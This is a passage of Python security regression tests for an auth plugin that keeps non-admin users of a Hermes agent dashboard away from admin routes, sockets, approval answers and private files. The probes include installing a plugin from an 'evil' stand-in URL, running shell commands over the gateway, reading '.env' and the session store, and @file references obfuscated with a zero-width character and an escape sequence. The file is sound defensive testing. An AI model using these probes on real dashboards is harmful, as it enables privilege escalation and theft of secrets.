    for name in ("dashboard_install_plugin", "dashboard_set_agent_plugin_enabled", "dashboard_update_user_plugin",
                 "dashboard_remove_user_plugin", "_clone_plugin_repo"):
        monkeypatch.setattr(plugins_cmd, name, lambda *a, _n=name, **k: calls.append((_n, a, k)) or {"ok": True, "name": "stub"})
    registry.clear_providers()
    token_auth.clear_token_routes()
    ws_tickets._reset_for_tests()
    ctx = Ctx()
    plugin.register(ctx)
    from starlette.testclient import TestClient

    yield SimpleNamespace(plugin=plugin, guard=plugin._resident_guard, ctx=ctx, registry=registry,
                          token_auth=token_auth, middleware=middleware, ws_tickets=ws_tickets, chat=web_server_chat,
                          tui_server=tui_server, tui_ws=tui_ws, files=files, home=tmp_path,
                          app=web_server.app, web_server=web_server, calls=calls, file_safety=file_safety,
                          context_references=context_references,
                          client=lambda: TestClient(web_server.app))
    registry.clear_providers()
    token_auth.clear_token_routes()
    ws_tickets._reset_for_tests()


def mint(hermes, role):
    return hermes.registry.get_provider("edgecity")._mint(f"{role}-id", f"{role}@example.org", role)


def as_role(hermes, role):
    client = hermes.client()
    client.cookies.set("hermes_session_at", mint(hermes, role).access_token)
    return client


def admin_only(resp):
    return (resp.status_code == 403 and resp.headers.get("content-type", "").startswith("application/json")
            and resp.json().get("reason") == "admin_only")


def ticket(client):
    resp = client.post("/api/auth/ws-ticket")
    assert resp.status_code == 200, resp.text
    return resp.json()["ticket"]


def ws_refused(client, url):
    """The close code of a socket refused before accept, or None when it was accepted."""
    from starlette.websockets import WebSocketDisconnect

    try:
        with client.websocket_connect(url) as sock:
            sock.close()
            return None
    except WebSocketDisconnect as exc:
        return exc.code


def rpc_call(sock, method, params=None, rid=1):
    sock.send_json({"jsonrpc": "2.0", "id": rid, "method": method, "params": params or {}})
    while True:
        frame = sock.receive_json()
        if frame.get("id") == rid:
            return frame


SEAMS = (("middleware", "gated_auth_middleware"), ("ws_tickets", "mint_ticket"), ("ws_tickets", "consume_ticket"),
         ("chat", "_ws_auth_reason"), ("tui_server", "dispatch"), ("tui_ws", "handle_ws"),
         ("ws_tickets", "consume_internal_credential"), ("chat", "_resolve_chat_argv_async"), ("chat", "PtyBridge"))


def test_hermes_register_installs_every_seam_once(hermes):
    g = hermes.guard
    assert {k: v for k, v in g.installed().items() if k != "files"} == {"http": True, "tickets": True, "ws": True,
                                                                         "gateway": True, "agent_reads": True,
                                                                         "references": True, "pty": True}
    originals = {name: getattr(getattr(hermes, mod), name)._edgecity_original for mod, name in SEAMS}
    for name, original in originals.items():
        assert not getattr(original, "_edgecity_resident_guard", False), name
    hermes.plugin.register(Ctx())
    for mod, name in SEAMS:
        assert getattr(getattr(hermes, mod), name)._edgecity_original is originals[name], name


def test_hermes_without_the_http_seam_the_plugin_refuses_to_load(load_plugin, web_server, tmp_path, monkeypatch):
    from hermes_cli.dashboard_auth import middleware, registry

    if hermes_version() != PINNED_VERSION:
        pytest.skip(f"pins Hermes {PINNED_VERSION}")

    plugin = load_plugin()
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    monkeypatch.setenv("TENANT_ID", TENANT)
    monkeypatch.setenv("CONTROL_PLANE_URL", "http://127.0.0.1:9")
    monkeypatch.delattr(middleware, "gated_auth_middleware")
    registry.clear_providers()
    with pytest.raises(plugin.ResidentGuardNotInstalled):
        plugin.register(Ctx())
    assert registry.get_provider("edgecity") is None


# ---- HTTP: every route the real app mounts -------------------------------------------------------


def all_routes(app):
    """(kind, method, path, endpoint module) for every route the app mounts: HTTP routes per method,
    websocket routes and mounts, through FastAPI's included routers and plain routes alike."""
    out = set()

    def walk(routes):
        for route in routes:
            if hasattr(route, "effective_candidates"):
                walk(list(route.effective_candidates()) + list(route.effective_low_priority_routes()))
                continue
            original = getattr(route, "original_route", route)
            # An included websocket route carries its path only on the original (its effective
            # context's is empty); a plugin's socket is then its path below the plugin prefix.
            path = getattr(route, "path", None) or getattr(original, "path", None)
            if path is None:
                continue
            endpoint = getattr(route, "endpoint", None) or getattr(original, "endpoint", None)
            module = getattr(endpoint, "__module__", "") or ""
            methods = getattr(original, "methods", None)
            kind = type(original).__name__
            if "WebSocket" in kind:
                out.add(("WS", "WS", path, module))
            elif methods is None:
                out.add(("MOUNT", "GET", path, kind))
            else:
                for method in methods:
                    out.add(("HTTP", method, path, module))

    walk(app.router.routes)
    return sorted(out, key=lambda r: (r[2], r[1]))


def concrete(path):
    import re

    return re.sub(r"\{[^}:]+:path\}", "x/y", re.sub(r"\{[^}:]+\}", "x", path))


def pinned(name):
    return sorted(line for line in (HERE / name).read_text(encoding="utf-8").splitlines() if line and not line.startswith("#"))


def hermes_version():
    import hermes_cli

    return getattr(hermes_cli, "__version__", "")


def test_hermes_every_http_route_is_listed_or_refused_for_an_owner(hermes):
    """Walk the real app. Each route is on the resident list, or an owner gets the guard's 403 on
    it through the real gate. The set of routes is pinned for Hermes 0.21.5: a route Hermes adds or
    removes fails here until someone classifies it (a new route is refused until listed)."""
    g = hermes.guard
    owner = as_role(hermes, "owner")
    listed, refused_, missed = [], [], []
    routes = all_routes(hermes.app)
    for kind, method, path, _module in routes:
        if kind != "HTTP" or method in ("HEAD", "OPTIONS"):
            continue
        target = concrete(path)
        if g.http_allowed(method, target, target):
            listed.append(f"{method} {path}")
            continue
        resp = owner.request(method, target, json={})
        (refused_ if admin_only(resp) else missed).append(f"{method} {path} -> {resp.status_code}")
    assert missed == []
    assert hermes.calls == []
    assert len(refused_) > 250 and len(listed) >= 30, (len(refused_), len(listed))
    for must in ("PUT /api/config", "PUT /api/config/raw", "POST /api/fs/write-text", "GET /api/fs/download",
                 "PUT /api/env", "POST /api/env/reveal", "POST /api/ops/hooks", "POST /api/gateway/restart",
                 "POST /api/dashboard/agent-plugins/install", "POST /api/mcp/servers", "POST /api/skills/hub/install"):
        assert any(r.startswith(must + " ") for r in refused_), must
    if hermes_version() != PINNED_VERSION:
        pytest.skip(f"route set pinned for Hermes {PINNED_VERSION}; this is {hermes_version()}")
    found = sorted(f"{kind} {method} {path}" for kind, method, path, _ in routes)
    expected = pinned("hermes_routes_0.21.5.txt")
    assert found == expected, {"added": sorted(set(found) - set(expected)), "removed": sorted(set(expected) - set(found))}


def test_hermes_every_public_path_of_the_gate_is_listed(hermes):
    """The gate hands its public paths on with no session (an admin's too): each must be on the list
    or the guard would break sign-in and the probes for everyone."""
    from hermes_cli.dashboard_auth import middleware, public_paths

    g = hermes.guard
    for path in sorted(public_paths.PUBLIC_API_PATHS):
        assert any(g.http_allowed(m, path, path) for m in ("GET", "POST")), path
    for prefix in middleware._GATE_PUBLIC_PREFIXES:
        target = prefix + "x" if prefix.endswith("/") else prefix
        assert any(g.http_allowed(m, target, target) for m in ("GET", "POST")), prefix


def test_hermes_an_owner_keeps_the_resident_pages(hermes):
    owner = as_role(hermes, "owner")
    assert owner.get("/api/auth/me").json()["org_id"] == "owner"
    assert owner.get("/api/sessions").status_code == 200
    assert admin_only(owner.get("/api/sessions/stats"))  # S-r3-1: box-wide counts are an admin's
    assert owner.get("/api/status").status_code == 200
    assert owner.get("/api/profiles").status_code == 200
    assert owner.get("/api/dashboard/plugins").status_code == 200
    assert owner.post("/api/auth/ws-ticket").status_code == 200
    assert owner.get("/assets/index-test.js").status_code == 200
    page = owner.get("/sessions")
    assert page.status_code == 200 and 'data-edgecity="plugins-admin-only"' in page.text


def test_hermes_an_admin_reaches_the_handlers(hermes):
    admin = as_role(hermes, "admin")
    assert admin.get("/api/dashboard/plugins/hub").json() == {"stub": "hub"}
    assert admin.get("/api/config").status_code == 200
    assert admin.get("/api/env").status_code == 200
    resp = admin.post("/api/dashboard/agent-plugins/install", json={"identifier": "https://example.invalid/x.git"})
    assert not admin_only(resp)
    assert [c[0] for c in hermes.calls if c[0] != "scan"] == ["dashboard_install_plugin"]
    assert 'data-edgecity="plugins-admin-only"' not in admin.get("/sessions").text


# ---- the refuter's probes (SEC1-refute.md), now regression tests --------------------------------


def read_yaml(path):
    import yaml

    return yaml.safe_load(path.read_text()) if path.exists() else None


def test_hermes_m2_put_config_is_refused(hermes):
    owner = as_role(hermes, "owner")
    for body in ({"config": {"plugins": {"disabled": ["av-approval"], "enabled": ["evil-plugin"]}}},
                 {"config": {"memory": {"provider": "evil-memory"}}}, {"config": {"hooks": {}}},
                 {"config": {"display": {"skin": "x"}}}):
        assert admin_only(owner.put("/api/config", json=body))
    assert read_yaml(hermes.home / "config.yaml") in (None, {})


def test_hermes_m3_file_and_raw_config_writes_are_refused(hermes):
    owner = as_role(hermes, "owner")
    plug = hermes.home / "plugins" / "av-events"
    plug.mkdir(parents=True)
    (plug / "__init__.py").write_text("# original\n")
    assert admin_only(owner.post("/api/fs/write-text", json={"path": str(plug / "__init__.py"), "content": "# x\n"}))
    assert admin_only(owner.post("/api/fs/write-text", json={"path": str(hermes.home / "work.md"), "content": "x"}))
    assert admin_only(owner.put("/api/config/raw", json={"yaml_text": "plugins:\n  disabled: [av-approval]\n"}))
    assert (plug / "__init__.py").read_text() == "# original\n" and not (hermes.home / "work.md").exists()


def test_hermes_m4a_nobody_downloads_the_session_store(hermes):
    db = hermes.home / ".dashboard-auth-edgecity" / "sessions.sqlite3"
    assert db.exists()
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    for route in ("/api/fs/download", "/api/fs/read-data-url", "/api/fs/read-text"):
        assert admin_only(owner.get(route, params={"path": str(db)}))
        resp = admin.get(route, params={"path": str(db)})
        assert resp.status_code == 403 and "SQLite" not in resp.text, (route, resp.status_code)  # Hermes's own guard
    assert ".dashboard-auth-edgecity" in hermes.files._SENSITIVE_MANAGED_DIR_NAMES


def test_hermes_m4a_an_old_signing_key_is_replaced_once(hermes):
    import sqlite3

    provider = hermes.registry.get_provider("edgecity")
    old_secret = provider._secret
    stale = mint(hermes, "admin")
    db = sqlite3.connect(provider._db_path)
    db.execute("DELETE FROM meta")  # what a 1.2.x store looks like: a key and no generation
    db.commit()
    db.close()
    rotated = hermes.plugin.EdgeCityDashboardAuth()
    assert rotated._secret != old_secret
    assert rotated.verify_session(access_token=stale.access_token) is None
    with rotated._db() as conn:
        assert conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0] == 0
    again = hermes.plugin.EdgeCityDashboardAuth()
    assert again._secret == rotated._secret  # once, not on every start


def test_hermes_m4b_s4_env_writes_are_refused(hermes):
    owner = as_role(hermes, "owner")
    for key, value in (("CONTROL_PLANE_URL", "http://127.0.0.1:9/placeholder"), ("AV_APPROVAL_ENABLED", "0"),
                       ("TENANT_ID", "x"), ("LANDING_URL", "http://x")):
        assert admin_only(owner.put("/api/env", json={"key": key, "value": value}))
        assert admin_only(owner.request("DELETE", "/api/env", json={"key": key}))
    assert admin_only(owner.post("/api/env/reveal", json={"key": "TENANT_ID"}))
    assert not (hermes.home / ".env").exists()


def test_hermes_s1_s2_hooks_mcp_skills_restart_are_refused(hermes):
    owner = as_role(hermes, "owner")
    assert admin_only(owner.post("/api/ops/hooks", json={"event": "pre_tool_call", "command": "/bin/true", "approve": True}))
    assert admin_only(owner.post("/api/mcp/servers", json={"name": "p", "command": "/bin/true", "args": []}))
    assert admin_only(owner.post("/api/skills/hub/install", json={"identifier": "x"}))
    assert admin_only(owner.post("/api/gateway/restart"))
    assert read_yaml(hermes.home / "config.yaml") in (None, {})


def test_hermes_a_listed_route_naming_a_private_path_is_refused(hermes):
    owner = as_role(hermes, "owner")
    resp = owner.get("/api/sessions", params={"path": str(hermes.home / ".env")})
    assert resp.status_code == 403 and resp.json()["reason"] == "private_path"
    assert owner.get("/.env").json()["reason"] == "private_path"


# ---- sockets through the real app ----------------------------------------------------------------


def test_hermes_tickets_carry_the_role_of_the_session_that_minted_them(hermes):
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    assert hermes.ws_tickets.consume_ticket(ticket(owner))["edgecity_role"] == "resident"
    assert hermes.ws_tickets.consume_ticket(ticket(admin))["edgecity_role"] == "admin"


@pytest.mark.parametrize("url", ["/api/console", "/api/pub?channel=c1", "/api/events?channel=c1",
                                 "/api/audio/speak-stream", "/api/plugins/kanban/events"])
def test_hermes_m1_an_owner_opens_no_socket_but_the_chat_gateway(hermes, url):
    """Every socket but the chat gateway and (round 4, its own tests below) the Chat tab."""
    owner = as_role(hermes, "owner")
    sep = "&" if "?" in url else "?"
    code = ws_refused(owner, f"{url}{sep}ticket={ticket(owner)}")
    assert code in (4401, 1008), (url, code)
    assert hermes.guard.counts().get("denied_ws_resident", 0) == 1


def test_hermes_m1_the_console_and_feeds_are_an_admins(hermes):
    admin = as_role(hermes, "admin")
    with admin.websocket_connect(f"/api/console?ticket={ticket(admin)}") as sock:
        assert sock.receive_json()["type"] == "ready"
    assert ws_refused(admin, f"/api/events?channel=c1&ticket={ticket(admin)}") is None


def test_hermes_m5_an_owner_on_the_chat_gateway_gets_only_the_method_list(hermes):
    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        assert sock.receive_json()["params"]["type"] == "gateway.ready"
        for method, params in (("shell.exec", {"command": "echo refuter-probe"}),
                               ("plugins.manage", {"action": "install", "identifier": "https://example.invalid/evil.git"}),
                               ("plugins.manage", {"action": "toggle", "name": "av-approval", "enable": False}),
                               ("cli.exec", {"argv": ["plugins", "install", "x"]}),
                               ("config.set", {"key": "x", "value": "y"}),
                               ("file.attach", {"path": str(hermes.home / ".env")}),
                               ("approval.respond", {"choice": "always"})):
            frame = rpc_call(sock, method, params)
            assert frame.get("error", {}).get("code") == 4031, (method, frame)
        listed = rpc_call(sock, "session.list", {})
        assert listed.get("error", {}).get("code") != 4031, listed
    assert hermes.calls == []


def test_hermes_every_gateway_method_is_listed_or_refused_for_an_owner(hermes):
    """Every method in the real `_methods` table: on the resident list, or refused to an owner over
    the real socket. The set is pinned for 0.21.5: a method Hermes adds fails here until classified
    (it is refused until listed). Every listed method exists."""
    g = hermes.guard
    methods = sorted(hermes.tui_server._methods)
    assert set(g.RESIDENT_GATEWAY_METHODS) <= set(methods), set(g.RESIDENT_GATEWAY_METHODS) - set(methods)
    owner = as_role(hermes, "owner")
    missed = []
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        sock.receive_json()
        for i, method in enumerate(m for m in methods if m not in g.RESIDENT_GATEWAY_METHODS):
            frame = rpc_call(sock, method, {}, rid=100 + i)
            if frame.get("error", {}).get("code") != 4031:
                missed.append(method)
    assert missed == []
    assert hermes.calls == []
    if hermes_version() != PINNED_VERSION:
        pytest.skip(f"method set pinned for Hermes {PINNED_VERSION}; this is {hermes_version()}")
    expected = pinned("hermes_gateway_methods_0.21.5.txt")
    assert methods == expected, {"added": sorted(set(methods) - set(expected)), "removed": sorted(set(expected) - set(methods))}


def test_hermes_an_admin_on_the_chat_gateway_keeps_every_method(hermes):
    admin = as_role(hermes, "admin")
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as sock:
        sock.receive_json()
        frame = rpc_call(sock, "plugins.manage", {"action": "list"})
        assert frame.get("error", {}).get("code") != 4031, frame


def test_hermes_the_pty_childs_internal_credential(hermes):
    client = hermes.client()
    cred = hermes.ws_tickets.internal_ws_credential()
    with client.websocket_connect(f"/api/ws?internal={cred}") as sock:
        sock.receive_json()
        frame = rpc_call(sock, "plugins.manage", {"action": "list"})
        assert frame.get("error", {}).get("code") != 4031, frame
    assert ws_refused(client, f"/api/console?internal={cred}") == 4401
    assert ws_refused(client, f"/api/pty?internal={cred}") == 4401


def test_hermes_a_display_ticket_minted_outside_an_admin_request_is_refused(hermes):
    from starlette.websockets import WebSocketDisconnect

    t = hermes.ws_tickets.mint_ticket(user_id="u1", provider="bot-desktop", extra={"hermes_home": str(hermes.home)})
    client = hermes.client()
    with pytest.raises(WebSocketDisconnect) as exc:
        with client.websocket_connect(f"/api/display/ws?display_ticket={t}") as sock:
            sock.receive_bytes()
    assert exc.value.code == 4401
    assert hermes.guard.counts()["denied_display_ticket"] == 1


def test_hermes_every_websocket_route_is_known(hermes):
    found = sorted(path for kind, _m, path, _mod in all_routes(hermes.app) if kind == "WS")
    if hermes_version() != PINNED_VERSION:
        pytest.skip(f"socket set pinned for Hermes {PINNED_VERSION}")
    # "/events" is the kanban plugin's socket, mounted at /api/plugins/kanban/events.
    assert found == ["/api/audio/speak-stream", "/api/console", "/api/display/ws", "/api/events", "/api/pty",
                     "/api/pub", "/api/ws", "/events"]


def test_hermes_without_the_gateway_seam_an_owner_cannot_open_the_chat_gateway(hermes, monkeypatch):
    g = hermes.guard
    monkeypatch.setitem(g._installed, "gateway", False)

    def broken():
        raise ImportError("no tui_gateway")

    g.set_loader("gateway", broken)
    owner = as_role(hermes, "owner")
    assert ws_refused(owner, f"/api/ws?ticket={ticket(owner)}") == 4401
    admin = as_role(hermes, "admin")
    assert ws_refused(admin, f"/api/ws?ticket={ticket(admin)}") is None


def test_hermes_loopback_mode_is_the_resident_list(hermes, monkeypatch):
    monkeypatch.setattr(hermes.app.state, "auth_required", False)
    token = {hermes.web_server._SESSION_HEADER_NAME: hermes.web_server._SESSION_TOKEN}
    client = hermes.client()
    assert admin_only(client.put("/api/config", headers=token, json={"config": {}}))
    assert client.get("/api/sessions", headers=token).status_code == 200
    assert ws_refused(client, f"/api/console?token={hermes.web_server._SESSION_TOKEN}") == 4401
    with client.websocket_connect(f"/api/ws?token={hermes.web_server._SESSION_TOKEN}") as sock:
        sock.receive_json()
        assert rpc_call(sock, "shell.exec", {"command": "echo x"})["error"]["code"] == 4031


# ==================================================================================================
# Fix round 2 (SEC1-refute2.md): the refuter's probes and the hostile walk, against the real app
# ==================================================================================================


def ready(sock):
    frame = sock.receive_json()
    assert frame["params"]["type"] == "gateway.ready", frame
    return frame


def create(sock, rid=2, params=None):
    frame = rpc_call(sock, "session.create", params or {}, rid=rid)
    assert "result" in frame, frame
    return frame["result"]["session_id"]


def answers_requests(sock, rid=90):
    assert "result" in rpc_call(sock, "client.capabilities", {"server_requests": True}, rid=rid)


def queue_entry(session_key, request_id):
    """A pending approval in Hermes's own queue (`tools.approval._gateway_queues`), as the agent's
    dangerous-command wait leaves it."""
    import threading

    import tools.approval as approval

    entry = SimpleNamespace(data={"request_id": request_id}, result=None, event=threading.Event(),
                            reason=None, settle=None, cancelled=None)
    with approval._lock:
        approval._gateway_queues.setdefault(session_key, []).append(entry)
    return entry


def raise_approval(hermes, sock, sid, request_id):
    """The agent asks: Hermes's real `_emit_approval_request` sends an `approval` server request to
    the chat's socket. Returns the queue entry and the request frame the client received."""
    import threading

    key = hermes.tui_server._sessions[sid]["session_key"]
    entry = queue_entry(key, request_id)
    threading.Thread(target=hermes.tui_server._emit_approval_request,
                     args=(sid, {"request_id": request_id, "command": "print(1)", "description": "probe"})).start()
    for _ in range(50):
        frame = sock.receive_json()
        if frame.get("method") == "approval":
            return entry, frame
    raise AssertionError("no approval frame")


def frame_reply(sock, frame, sync_rid):
    """Send a raw frame; return the reply carrying its id, or None when Hermes answered nothing
    (a ping afterwards: frames are dispatched in order)."""
    sock.send_json(frame)
    sock.send_json({"jsonrpc": "2.0", "id": sync_rid, "method": "ping", "params": {}})
    reply = None
    while True:
        got = sock.receive_json()
        if got.get("id") == sync_rid:
            return reply
        if "id" in frame and got.get("id") == frame["id"] and "method" not in got:
            reply = got


def code_of(frame):
    return (frame or {}).get("error", {}).get("code")


def persist_like_the_waiter(approval, key, entry):
    """What `tools.approval._human_decision` does with the answer once the wait ends
    (`approval.py:830`): `session`/`always` persist; `always` writes config.yaml."""
    if entry.result:
        approval._persist_choice(key, entry.result, [("probe-pattern", "probe", False)])


@pytest.fixture
def config_writes(monkeypatch):
    """Every config.yaml write Hermes's approval code makes (`hermes_cli.config.save_config`, imported
    at call time by `save_permanent_allowlist`, `approval.py:448-470`), recorded instead of written."""
    from hermes_cli import config

    writes = []
    monkeypatch.setattr(config, "save_config", lambda cfg, *a, **k: writes.append(dict(cfg)))
    return writes


def allowlists(writes):
    return [w.get("command_allowlist") for w in writes if "command_allowlist" in w]


def test_hermes_m_new_1_an_owner_cannot_say_always_by_response_frame_or_request_answer(hermes, config_writes):
    import tools.approval as approval
    from tui_gateway import server_requests

    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        answers_requests(sock)
        sid = create(sock)
        key = hermes.tui_server._sessions[sid]["session_key"]
        assert code_of(rpc_call(sock, "approval.respond", {"session_id": sid, "choice": "always"}, rid=3)) == 4031
        entry, frame = raise_approval(hermes, sock, sid, "req-probe-1")
        assert "always" in frame["params"]["choices"]  # Hermes offers it
        for i, result in enumerate(({"choice": "always"}, {"choice": "ALWAYS"}, {"choice": None},
                                    {"choice": "permanent"}, "always")):
            reply = frame_reply(sock, {"jsonrpc": "2.0", "id": frame["id"], "result": result}, 10 + i)
            assert code_of(reply) == 4031, (result, reply)
            via = rpc_call(sock, "request.answer", {"id": frame["id"], "result": result}, rid=20 + i)
            assert code_of(via) == 4031, (result, via)
        assert entry.result is None and frame["id"] in server_requests._open  # still waiting
        # Once is fine: the entry resolves, nothing persists.
        assert frame_reply(sock, {"jsonrpc": "2.0", "id": frame["id"], "result": {"choice": "once"}}, 30) is None
        assert entry.result == "once" and frame["id"] not in server_requests._open
        persist_like_the_waiter(approval, key, entry)
        # And session, through request.answer.
        entry2, frame2 = raise_approval(hermes, sock, sid, "req-probe-2")
        assert rpc_call(sock, "request.answer", {"id": frame2["id"], "result": {"choice": "session"}}, rid=31)["result"] == {"status": "ok"}
        assert entry2.result == "session"
        persist_like_the_waiter(approval, key, entry2)
    assert allowlists(config_writes) == [] and read_yaml(hermes.home / "config.yaml") is None
    assert hermes.guard.counts()["denied_gateway_always"] >= 9


def test_hermes_m_new_1_an_admin_still_says_always(hermes, config_writes):
    """The positive control: the same frame from an admin resolves `always`, and the waiter's
    persistence writes `command_allowlist`, the write a resident can no longer cause."""
    import tools.approval as approval

    admin = as_role(hermes, "admin")
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as sock:
        ready(sock)
        answers_requests(sock)
        sid = create(sock)
        key = hermes.tui_server._sessions[sid]["session_key"]
        entry, frame = raise_approval(hermes, sock, sid, "req-admin-always")
        assert frame_reply(sock, {"jsonrpc": "2.0", "id": frame["id"], "result": {"choice": "always"}}, 10) is None
        assert entry.result == "always"
        persist_like_the_waiter(approval, key, entry)
    assert allowlists(config_writes) == [["probe-pattern"]]


def seed_rows(hermes):
    """Stored sessions as Hermes writes them: the owner's dashboard chat, its Telegram chat, a
    landing admin's dashboard chat, the admin terminal's and cron's."""
    from hermes_state import SessionDB

    db = SessionDB(db_path=hermes.home / "state.db")
    try:
        for sid, source, user in (("own-chat", "tool", "edgecity:owner-id"), ("tg-chat", "telegram", "5550001"),
                                  ("admin-chat", "tool", "edgecity:admin-id"), ("pty-chat", "tui", None),
                                  ("cron-chat", "cron", None)):
            db.create_session(session_id=sid, source=source, user_id=user)
    finally:
        db.close()


def test_hermes_s_new_1_an_owner_cannot_touch_an_admins_chat(hermes):
    seed_rows(hermes)
    admin, owner = as_role(hermes, "admin"), as_role(hermes, "owner")
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as asock:
        ready(asock)
        answers_requests(asock)
        asid = create(asock)
        akey = hermes.tui_server._sessions[asid]["session_key"]
        entry, aframe = raise_approval(hermes, asock, asid, "req-admin-1")
        with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as osock:
            ready(osock)
            osid = create(osock)
            probes = [
                ("approval.respond", {"session_id": "not-a-live-sid", "request_id": "req-admin-1", "choice": "once"}),
                ("approval.respond", {"session_id": osid, "request_id": "req-admin-1", "choice": "once"}),
                ("approval.respond", {"session_id": asid, "choice": "deny"}),
                ("approval.pending", {"session_id": asid}),
                ("approval.received", {"session_id": asid, "request_id": "req-admin-1"}),
                ("session.interrupt", {"session_id": asid}),
                ("session.close", {"session_id": asid}),
                ("session.title", {"session_id": asid, "title": "x"}),
                ("session.events.since", {"session_id": asid}),
                ("prompt.submit", {"session_id": asid, "text": "hi"}),
                ("image.detach", {"session_id": asid, "path": "x.png"}),
                ("model.options", {"session_id": asid}),
                ("request.answer", {"id": aframe["id"], "result": {"choice": "once"}}),
                ("session.resume", {"session_id": akey}),
                ("session.resume", {"session_id": "admin-chat"}),
                ("session.resume", {"session_id": "pty-chat"}),
                ("session.resume", {"session_id": "cron-chat"}),
                ("session.resume", {"session_id": "admin"}),  # a prefix or a title
                ("session.delete", {"session_id": "admin-chat"}),
                ("session.create", {"parent_session_id": "admin-chat"}),
            ]
            for i, (method, params) in enumerate(probes):
                frame = rpc_call(osock, method, params, rid=100 + i)
                assert code_of(frame) == 4031, (method, params, frame)
            reply = frame_reply(osock, {"jsonrpc": "2.0", "id": aframe["id"], "result": {"choice": "once"}}, 200)
            assert code_of(reply) == 4031 and reply["error"]["data"]["reason"] == "not_own_session"
            # Its own chats: the live one, its stored ones and its Telegram chat.
            assert code_of(rpc_call(osock, "approval.pending", {"session_id": osid}, rid=201)) != 4031
            for i, stored in enumerate(("own-chat", "tg-chat")):
                assert code_of(rpc_call(osock, "session.resume", {"session_id": stored}, rid=202 + i)) != 4031, stored
        assert entry.result is None and asid in hermes.tui_server._sessions
        assert hermes.guard.counts()["denied_gateway_session"] >= 18


def test_hermes_s_new_1_session_routes_answer_an_owner_for_its_own_sessions_only(hermes):
    seed_rows(hermes)
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    for sid in ("admin-chat", "pty-chat", "cron-chat", "nope"):
        for method, suffix in (("GET", "/messages"), ("GET", "/export"), ("GET", ""), ("GET", "/timeline"),
                               ("PATCH", ""), ("DELETE", "")):
            resp = owner.request(method, f"/api/sessions/{sid}{suffix}", json={"title": "x"})
            assert resp.status_code == 403 and resp.json()["reason"] == "not_own_session", (sid, method, suffix)
    for sid in ("own-chat", "tg-chat", "own-"):
        assert owner.get(f"/api/sessions/{sid}/messages").status_code == 200, sid
    for sid in ("admin-chat", "pty-chat", "own-chat"):
        assert admin.get(f"/api/sessions/{sid}/messages").status_code == 200, sid
    for method, target in (("GET", "/api/sessions/search?q=probe"), ("POST", "/api/sessions/bulk-delete"),
                           ("POST", "/api/sessions/prune"), ("DELETE", "/api/sessions/empty")):
        assert admin_only(owner.request(method, target, json={"ids": ["admin-chat"], "older_than_days": 1})), target
    assert admin.get("/api/sessions/search", params={"q": "probe"}).status_code == 200
    from hermes_state import SessionDB

    db = SessionDB(db_path=hermes.home / "state.db")
    try:
        assert db.get_session("admin-chat") is not None and db.get_session("pty-chat") is not None
    finally:
        db.close()


@pytest.fixture
def quiet_turns(hermes, monkeypatch):
    """prompt.submit accepted without running a turn (the test app has no model provider, so the
    agent build fails fast and the turn would only report that)."""
    monkeypatch.setattr(hermes.tui_server, "_run_after_agent_ready", lambda *a, **k: None)
    return hermes


FILE_REF_PROMPTS = ("@file:config.yaml", "please read @file:plugins/p1/__init__.py", "@folder:.dashboard-auth-edgecity",
                    "@FILE:config.yaml", "@fi​le:config.yaml", "@fi\x1b[200~le:config.yaml",
                    "@file:hooks/h.sh", "@file:'.dashboard-auth-edgecity/sessions.sqlite3'")


def plant_private_files(home):
    (home / "config.yaml").write_text("probe_key: example-not-a-key\n")
    (home / "plugins" / "p1").mkdir(parents=True, exist_ok=True)
    (home / "plugins" / "p1" / "__init__.py").write_text("print('example-not-a-key')\n")
    (home / "hooks").mkdir(exist_ok=True)
    (home / "hooks" / "h.sh").write_text("echo example-not-a-key\n")
    (home / ".env").write_text("X=example-not-a-key\n")
    (home / "AGENTS.md").write_text("# village rules\n")


def test_hermes_s_new_3_an_owner_chat_runs_in_the_resident_directory_and_sends_no_file_references(quiet_turns):
    hermes = quiet_turns
    plant_private_files(hermes.home)
    owner = as_role(hermes, "owner")
    resident_dir = os.path.realpath(hermes.home / "resident-chat")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        sid = create(sock, params={"source": "tool", "close_on_disconnect": True})
        assert hermes.tui_server._sessions[sid]["cwd"] == resident_dir
        assert os.path.realpath(os.path.join(resident_dir, "AGENTS.md")) == os.path.realpath(hermes.home / "AGENTS.md")
        for i, cwd in enumerate((str(hermes.home), "/", str(hermes.home / "plugins"),
                                 str(hermes.home / ".dashboard-auth-edgecity"), resident_dir + "/..", "~")):
            assert code_of(rpc_call(sock, "session.create", {"cwd": cwd}, rid=10 + i)) == 4031, cwd
        for i, text in enumerate(FILE_REF_PROMPTS):
            assert code_of(rpc_call(sock, "prompt.submit", {"session_id": sid, "text": text}, rid=30 + i)) == 4031, text
        ok = rpc_call(sock, "prompt.submit", {"session_id": sid, "text": "hello there"}, rid=60)
        assert code_of(ok) is None, ok
    admin = as_role(hermes, "admin")
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as sock:
        ready(sock)
        asid = create(sock, params={"cwd": str(hermes.home)})
        assert hermes.tui_server._sessions[asid]["cwd"] == str(hermes.home)


def test_hermes_s_new_3_hermess_own_expansion_inlines_no_private_file(hermes):
    """`agent.context_references.preprocess_context_references`, as `prompt_turn.py:599` calls it
    (`cwd = allowed_root = the chat's cwd`): from the resident directory nothing private is in
    reach, and even with HERMES_HOME as the cwd (the messaging gateway's `terminal.cwd` on village
    boxes, or a workspace the agent moved) config.yaml, plugin code, hooks and the key store are
    refused by the plugin's check."""
    from agent.context_references import preprocess_context_references

    plant_private_files(hermes.home)
    resident_dir = hermes.guard.resident_cwd()
    for cwd in (resident_dir, str(hermes.home)):
        for ref in ("@file:config.yaml", "@file:../config.yaml", "@file:plugins/p1/__init__.py",
                    "@file:../plugins/p1/__init__.py", "@file:hooks/h.sh", "@folder:.dashboard-auth-edgecity",
